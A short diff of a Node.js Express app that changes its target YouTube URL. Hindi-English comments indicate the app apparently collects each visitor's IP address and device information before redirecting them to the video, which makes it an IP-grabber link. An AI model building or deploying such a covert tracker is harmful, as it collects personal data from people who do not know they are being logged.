@@ -2,7 +2,7 @@ const express = require('express');
 const app = express();
 
 // Yahan apna target YouTube link ya koi bhi link daalein jahan user ko bhejna hai
-const TARGET_URL = 'https://www.youtube.com/shorts/qE';
+const TARGET_URL = 'https://youtu.be/e3xcr35mVvQ?si=d2A6zKsG341PCJyA';
 
 app.get('/', (req, res) => {
     // 1. IP Address aur Device info nikalna
